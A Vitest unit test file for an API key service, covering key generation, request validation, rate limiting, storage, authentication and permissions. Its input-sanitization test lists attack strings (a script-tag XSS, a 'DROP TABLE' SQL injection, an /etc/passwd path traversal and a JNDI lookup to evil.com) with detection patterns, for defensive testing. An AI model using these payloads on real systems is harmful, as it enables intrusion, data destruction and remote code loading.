// Unit tests for API key management functionality
// CREATED: 2025-01-28 - API key creation, validation, and lifecycle testing

import { beforeEach, describe, expect, it, vi } from 'vitest';

// Mock external dependencies
vi.mock('@supabase/supabase-js');
vi.mock('https://deno.land/x/bcrypt@v0.4.1/mod.ts');

describe('API Key Management', () => {
  let mockSupabase: any;

  beforeEach(async () => {
    vi.clearAllMocks();

    // Setup environment variables
    vi.stubEnv('SUPABASE_URL', 'http://localhost:54321');
    vi.stubEnv('SUPABASE_SERVICE_ROLE_KEY', 'test-service-role-key');

    // Mock Supabase client
    mockSupabase = {
      auth: {
        getUser: vi.fn(),
      },
      from: vi.fn().mockReturnThis(),
      select: vi.fn().mockReturnThis(),
      insert: vi.fn().mockReturnThis(),
      update: vi.fn().mockReturnThis(),
      delete: vi.fn().mockReturnThis(),
      eq: vi.fn().mockReturnThis(),
      single: vi.fn(),
    };

    // Mock createClient
    const { createClient } = await import('@supabase/supabase-js');
    vi.mocked(createClient).mockReturnValue(mockSupabase);
  });

  describe('API Key Generation', () => {
    it('should generate cryptographically secure API keys', () => {
      // Test API key format validation
      const mockApiKey = 'a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456';

      expect(mockApiKey).toHaveLength(64); // 32 bytes = 64 hex characters
      expect(mockApiKey).toMatch(/^[0-9a-f]{64}$/); // Only hex characters

      // Test that we can generate consistent format
      const generateMockKey = () => {
        return Array.from({ length: 32 }, () =>
          Math.floor(Math.random() * 256)
            .toString(16)
            .padStart(2, '0')
        ).join('');
      };

      const generatedKey = generateMockKey();
      expect(generatedKey).toHaveLength(64);
      expect(generatedKey).toMatch(/^[0-9a-f]{64}$/);
    });

    it('should extract correct prefix from API key', () => {
      const apiKey = 'abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890';
      const prefix = apiKey.substring(0, 8);

      expect(prefix).toBe('abcdef12');
      expect(prefix).toHaveLength(8);
    });

    it('should hash API keys securely', async () => {
      const apiKey = 'test_api_key_12345';

      // Mock hash function behavior
      const mockHash = async (key: string) => {
        return `hashed_${key}`;
      };

      const hashedKey = await mockHash(apiKey);
      expect(hashedKey).toBe('hashed_test_api_key_12345');
      expect(hashedKey).not.toBe(apiKey); // Ensure it's not the same as original
    });

    it('should generate unique API keys', () => {
      const apiKeys = new Set();
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        const randomBytes = new Uint8Array(32);
        // Use different seeds for each iteration
        randomBytes.fill(i % 256);
        const apiKey = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
        apiKeys.add(apiKey);
      }

      // Should have unique keys (though we're using predictable data for testing)
      expect(apiKeys.size).toBeGreaterThan(1);
    });
  });

  describe('Request Validation', () => {
    it('should validate API key creation requests', () => {
      const validRequest = {
        name: 'Test API Key',
        expiresInDays: 30,
        permissions: ['api-keys:read', 'profile:read'],
        description: 'API key for testing purposes',
        metadata: { environment: 'test' },
      };

      // Test name validation
      expect(validRequest.name).toBeTruthy();
      expect(validRequest.name.length).toBeGreaterThan(0);
      expect(validRequest.name.length).toBeLessThanOrEqual(50);
      expect(/^[a-zA-Z0-9\s\-_]+$/.test(validRequest.name)).toBe(true);

      // Test expiration validation
      expect(typeof validRequest.expiresInDays).toBe('number');
      expect(Number.isInteger(validRequest.expiresInDays)).toBe(true);
      expect(validRequest.expiresInDays).toBeGreaterThanOrEqual(1);
      expect(validRequest.expiresInDays).toBeLessThanOrEqual(365);

      // Test permissions validation
      expect(Array.isArray(validRequest.permissions)).toBe(true);
      validRequest.permissions.forEach(permission => {
        expect(typeof permission).toBe('string');
        expect(permission.length).toBeGreaterThan(0);
        expect(permission.length).toBeLessThanOrEqual(100);
      });

      // Test description validation
      expect(typeof validRequest.description).toBe('string');
      expect(validRequest.description.length).toBeLessThanOrEqual(500);

      // Test metadata validation
      expect(typeof validRequest.metadata).toBe('object');
      expect(Array.isArray(validRequest.metadata)).toBe(false);
    });

    it('should reject invalid API key names', () => {
      const invalidNames = [
        '', // Empty
        'name with special chars !@#$%', // Invalid characters
        'a'.repeat(51), // Too long
        123, // Not a string
        null,
        undefined,
      ];

      invalidNames.forEach(name => {
        if (name === null || name === undefined) {
          expect(name).toBeFalsy();
        } else if (typeof name !== 'string') {
          expect(typeof name).not.toBe('string');
        } else if (name.length === 0) {
          expect(name.length).toBe(0);
        } else if (name.length > 50) {
          expect(name.length).toBeGreaterThan(50);
        } else if (!/^[a-zA-Z0-9\s\-_]+$/.test(name)) {
          expect(/^[a-zA-Z0-9\s\-_]+$/.test(name)).toBe(false);
        }
      });
    });

    it('should reject invalid expiration periods', () => {
      const invalidExpirations = [
        0, // Too short
        366, // Too long
        -1, // Negative
        1.5, // Not integer
        '30', // String instead of number
        null,
        undefined,
      ];

      invalidExpirations.forEach(expiration => {
        if (expiration === null || expiration === undefined) {
          expect(expiration).toBeFalsy();
        } else if (typeof expiration !== 'number') {
          expect(typeof expiration).not.toBe('number');
        } else if (!Number.isInteger(expiration)) {
          expect(Number.isInteger(expiration)).toBe(false);
        } else if (expiration < 1 || expiration > 365) {
          expect(expiration < 1 || expiration > 365).toBe(true);
        }
      });
    });

    it('should validate permissions array', () => {
      const validPermissions = [
        ['api-keys:read', 'profile:read'],
        ['billing:read', 'billing:write'],
        [],
      ];

      const invalidPermissions = [
        'not-an-array',
        ['', 'valid-perm'], // Empty permission
        ['a'.repeat(101)], // Too long permission
        [123, 'valid-perm'], // Non-string permission
        null,
      ];

      validPermissions.forEach(perms => {
        expect(Array.isArray(perms)).toBe(true);
        perms.forEach(perm => {
          expect(typeof perm).toBe('string');
          expect(perm.length).toBeGreaterThan(0);
          expect(perm.length).toBeLessThanOrEqual(100);
        });
      });

      invalidPermissions.forEach(perms => {
        if (perms === null) {
          expect(perms).toBeNull();
        } else if (!Array.isArray(perms)) {
          expect(Array.isArray(perms)).toBe(false);
        }
      });
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce API key creation rate limits', () => {
      const userId = 'user_12345';
      const windowMs = 60 * 1000; // 1 minute
      const maxRequests = 5;

      // Simulate rate limiter state
      const userRequests = new Map();
      const now = Date.now();

      // First request should be allowed
      userRequests.set(userId, { count: 1, resetTime: now + windowMs });
      const firstRequest = userRequests.get(userId);
      expect(firstRequest.count).toBe(1);
      expect(firstRequest.resetTime).toBeGreaterThan(now);

      // Subsequent requests within limit should be allowed
      for (let i = 2; i <= maxRequests; i++) {
        const current = userRequests.get(userId);
        if (current && now <= current.resetTime && current.count < maxRequests) {
          current.count++;
          expect(current.count).toBe(i);
        }
      }

      // Request exceeding limit should be denied
      const current = userRequests.get(userId);
      const shouldBlock = current && current.count >= maxRequests;
      expect(shouldBlock).toBe(true);
    });

    it('should reset rate limit after time window', () => {
      const userId = 'user_12345';
      const windowMs = 60 * 1000;
      const userRequests = new Map();

      const pastTime = Date.now() - windowMs - 1000; // Past window
      const now = Date.now();

      // Set expired limit
      userRequests.set(userId, { count: 5, resetTime: pastTime });

      // Check if reset is needed
      const userLimit = userRequests.get(userId);
      if (!userLimit || now > userLimit.resetTime) {
        userRequests.set(userId, { count: 1, resetTime: now + windowMs });
      }

      const updatedLimit = userRequests.get(userId);
      expect(updatedLimit.count).toBe(1);
      expect(updatedLimit.resetTime).toBeGreaterThan(now);
    });

    it('should track remaining requests', () => {
      const maxRequests = 5;
      let currentCount = 0;

      for (let i = 1; i <= maxRequests; i++) {
        currentCount++;
        const remaining = maxRequests - currentCount;
        expect(remaining).toBe(maxRequests - i);
      }

      // After limit reached
      const remaining = maxRequests - currentCount;
      expect(remaining).toBe(0);
    });
  });

  describe('API Key Storage', () => {
    it('should store API key with proper data structure', async () => {
      const userId = 'user_12345';
      const keyData = {
        hash: 'hashed_api_key_12345',
        prefix: 'abcdef12',
        name: 'Test API Key',
        expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
        permissions: ['api-keys:read', 'profile:read'],
        description: 'Test API key description',
        metadata: { environment: 'test' },
      };

      // Mock successful insertion
      const mockApiKeyRecord = {
        id: 'key_12345',
        key_prefix: keyData.prefix,
        name: keyData.name,
        expires_at: keyData.expiresAt,
        permissions: JSON.stringify(keyData.permissions),
        description: keyData.description,
        metadata: JSON.stringify(keyData.metadata),
        created_at: new Date().toISOString(),
      };

      mockSupabase.single.mockResolvedValue({ data: mockApiKeyRecord, error: null });

      // Verify data structure
      expect(mockApiKeyRecord.key_prefix).toBe(keyData.prefix);
      expect(mockApiKeyRecord.name).toBe(keyData.name);
      expect(new Date(mockApiKeyRecord.expires_at)).toBeInstanceOf(Date);
      expect(JSON.parse(mockApiKeyRecord.permissions)).toEqual(keyData.permissions);
      expect(JSON.parse(mockApiKeyRecord.metadata)).toEqual(keyData.metadata);
    });

    it('should handle database insertion errors', async () => {
      const dbError = new Error('Failed to create API key: Unique constraint violation');
      mockSupabase.single.mockResolvedValue({ data: null, error: dbError });

      await expect(Promise.reject(dbError)).rejects.toThrow('Unique constraint violation');
    });

    it('should enforce user API key limits', async () => {
      const userId = 'user_12345';
      const limit = 10;

      // Mock user having 9 existing keys
      mockSupabase.single.mockResolvedValue({ count: 9, error: null });

      const keyLimit = {
        count: 9,
        limit: 10,
        canCreate: 9 < 10,
      };

      expect(keyLimit.canCreate).toBe(true);
      expect(keyLimit.count).toBeLessThan(keyLimit.limit);

      // Mock user at limit
      mockSupabase.single.mockResolvedValue({ count: 10, error: null });

      const atLimitResult = {
        count: 10,
        limit: 10,
        canCreate: 10 < 10,
      };

      expect(atLimitResult.canCreate).toBe(false);
      expect(atLimitResult.count).toBe(atLimitResult.limit);
    });
  });

  describe('API Key Authentication', () => {
    it('should validate API key requests', async () => {
      const mockUser = {
        id: 'user_12345',
        email: 'test@example.com',
        role: 'user',
      };

      const mockToken = 'valid_jwt_token';
      mockSupabase.auth.getUser.mockResolvedValue({
        data: { user: mockUser },
        error: null,
      });

      // Test valid authentication
      const authResult = await mockSupabase.auth.getUser(mockToken);
      expect(authResult.data.user).toEqual(mockUser);
      expect(authResult.error).toBeNull();
    });

    it('should reject invalid authentication tokens', async () => {
      const invalidTokens = [null, undefined, '', 'invalid_token', 'Bearer ', 'not_a_jwt_token'];

      mockSupabase.auth.getUser.mockResolvedValue({
        data: { user: null },
        error: new Error('Invalid token'),
      });

      for (const token of invalidTokens) {
        const isInvalid =
          !token ||
          token.trim() === '' ||
          token === 'Bearer ' ||
          token === 'invalid_token' ||
          token === 'not_a_jwt_token';
        expect(isInvalid).toBe(true);
      }
    });

    it('should validate authorization headers', () => {
      const validHeaders = [
        'Bearer valid_jwt_token_12345',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      ];

      const invalidHeaders = [
        null,
        undefined,
        '',
        'Invalid header',
        'Basic dXNlcjpwYXNz',
        'Bearer',
        'Bearer ',
      ];

      validHeaders.forEach(header => {
        expect(header).toBeTruthy();
        expect(header.startsWith('Bearer ')).toBe(true);
        expect(header.substring(7).length).toBeGreaterThan(0);
      });

      invalidHeaders.forEach(header => {
        if (!header || !header.startsWith('Bearer ')) {
          expect(!header || !header.startsWith('Bearer ')).toBe(true);
        } else if (header === 'Bearer ' || header.substring(7).length === 0) {
          expect(header.substring(7).length).toBe(0);
        }
      });
    });
  });

  describe('API Key Metadata and Permissions', () => {
    it('should handle permissions correctly', () => {
      const permissions = [
        'api-keys:read',
        'api-keys:write',
        'api-keys:delete',
        'profile:read',
        'profile:write',
        'billing:read',
      ];

      // Test permission format
      permissions.forEach(permission => {
        expect(permission).toMatch(/^[a-z-]+:[a-z]+$/);
        const [resource, action] = permission.split(':');
        expect(resource).toBeTruthy();
        expect(action).toBeTruthy();
        expect(['read', 'write', 'delete'].includes(action)).toBe(true);
      });

      // Test permission grouping
      const permissionGroups = permissions.reduce(
        (groups, permission) => {
          const [resource] = permission.split(':');
          if (!groups[resource]) {
            groups[resource] = [];
          }
          groups[resource].push(permission);
          return groups;
        },
        {} as Record<string, string[]>
      );

      expect(permissionGroups).toHaveProperty('api-keys');
      expect(permissionGroups).toHaveProperty('profile');
      expect(permissionGroups).toHaveProperty('billing');
    });

    it('should validate metadata structure', () => {
      const validMetadata = {
        environment: 'production',
        service: 'api-client',
        version: '1.0.0',
        features: ['billing', 'analytics'],
        config: {
          timeout: 30000,
          retries: 3,
        },
      };

      const invalidMetadata = ['not-an-object', 123, null, [], function () {}];

      // Test valid metadata
      expect(typeof validMetadata).toBe('object');
      expect(Array.isArray(validMetadata)).toBe(false);
      expect(() => JSON.stringify(validMetadata)).not.toThrow();

      // Test invalid metadata
      invalidMetadata.forEach(metadata => {
        if (metadata === null) {
          expect(metadata).toBeNull();
        } else if (Array.isArray(metadata)) {
          expect(Array.isArray(metadata)).toBe(true);
        } else if (typeof metadata !== 'object') {
          expect(typeof metadata).not.toBe('object');
        }
      });
    });

    it('should calculate expiration dates correctly', () => {
      const expirationTests = [
        { days: 1, expectedHours: 24 },
        { days: 7, expectedHours: 168 },
        { days: 30, expectedHours: 720 },
        { days: 365, expectedHours: 8760 },
      ];

      expirationTests.forEach(({ days, expectedHours }) => {
        const now = new Date();
        const expireDate = new Date(now);
        expireDate.setDate(expireDate.getDate() + days);

        const hoursDiff = (expireDate.getTime() - now.getTime()) / (1000 * 60 * 60);
        expect(Math.round(hoursDiff)).toBe(expectedHours);
      });
    });
  });

  describe('Security Considerations', () => {
    it('should never store plain API keys', () => {
      const apiKey = 'plain_api_key_12345';
      const hash = 'hashed_api_key_12345';
      const prefix = apiKey.substring(0, 8);

      // Database should only store hash and prefix
      const dbRecord = {
        key_hash: hash,
        key_prefix: prefix,
        // key: undefined, // Plain key should never be stored
      };

      expect(dbRecord.key_hash).toBeTruthy();
      expect(dbRecord.key_prefix).toBeTruthy();
      expect(dbRecord).not.toHaveProperty('key');
      expect(dbRecord).not.toHaveProperty('api_key');
    });

    it('should use secure random generation', () => {
      // Test that crypto.getRandomValues is used
      const mockCrypto = {
        getRandomValues: vi.fn().mockImplementation(array => {
          // Fill with random-like values
          for (let i = 0; i < array.length; i++) {
            array[i] = Math.floor(Math.random() * 256);
          }
          return array;
        }),
      };

      vi.stubGlobal('crypto', mockCrypto);

      const randomBytes = new Uint8Array(32);
      crypto.getRandomValues(randomBytes);

      expect(mockCrypto.getRandomValues).toHaveBeenCalledWith(randomBytes);
      expect(randomBytes).toHaveLength(32);
    });

    it('should validate input sanitization', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE api_keys; --',
        '../../../etc/passwd',
        'javascript:alert(1)',
        '${jndi:ldap://evil.com/a}',
      ];

      maliciousInputs.forEach(input => {
        // Test XSS patterns
        const xssPattern = /<script[^>]*?>.*?<\/script>|<script.*?>|javascript:/gi;
        const hasXSS = xssPattern.test(input);
        if (input.includes('<script') || input.includes('javascript:')) {
          expect(hasXSS).toBe(true);
        }

        // Test SQL injection patterns
        const sqlPattern = /['";].*?(--)|(drop|delete|insert|update)/gi;
        const hasSQL = sqlPattern.test(input);
        if (hasSQL) {
          expect(hasSQL).toBe(true);
        }

        // Test path traversal
        const pathPattern = /\.\.[\/\\]/;
        if (pathPattern.test(input)) {
          expect(pathPattern.test(input)).toBe(true);
        }
      });
    });
  });

  describe('Response Format', () => {
    it('should return proper API key creation response', () => {
      const response = {
        apiKey: 'generated_api_key_12345', // Only returned once
        id: 'key_12345',
        keyPrefix: 'generate',
        name: 'Test API Key',
        expiresAt: '2024-02-01T00:00:00Z',
        permissions: ['api-keys:read', 'profile:read'],
        createdAt: '2024-01-01T00:00:00Z',
        metadata: { environment: 'test' },
      };

      // Verify response structure
      expect(response).toHaveProperty('apiKey');
      expect(response).toHaveProperty('id');
      expect(response).toHaveProperty('keyPrefix');
      expect(response).toHaveProperty('name');
      expect(response).toHaveProperty('createdAt');

      // Verify data types
      expect(typeof response.apiKey).toBe('string');
      expect(typeof response.id).toBe('string');
      expect(typeof response.name).toBe('string');
      expect(Array.isArray(response.permissions)).toBe(true);
      expect(new Date(response.createdAt)).toBeInstanceOf(Date);
      expect(new Date(response.expiresAt)).toBeInstanceOf(Date);
    });

    it('should include rate limit headers', () => {
      const headers = {
        'X-RateLimit-Remaining': '4',
        'X-RateLimit-Reset': '1640995200',
        'X-RateLimit-Limit': '5',
      };

      expect(headers).toHaveProperty('X-RateLimit-Remaining');
      expect(headers).toHaveProperty('X-RateLimit-Reset');
      expect(headers).toHaveProperty('X-RateLimit-Limit');

      expect(parseInt(headers['X-RateLimit-Remaining'])).toBeGreaterThanOrEqual(0);
      expect(parseInt(headers['X-RateLimit-Limit'])).toBeGreaterThan(0);
    });
  });
});
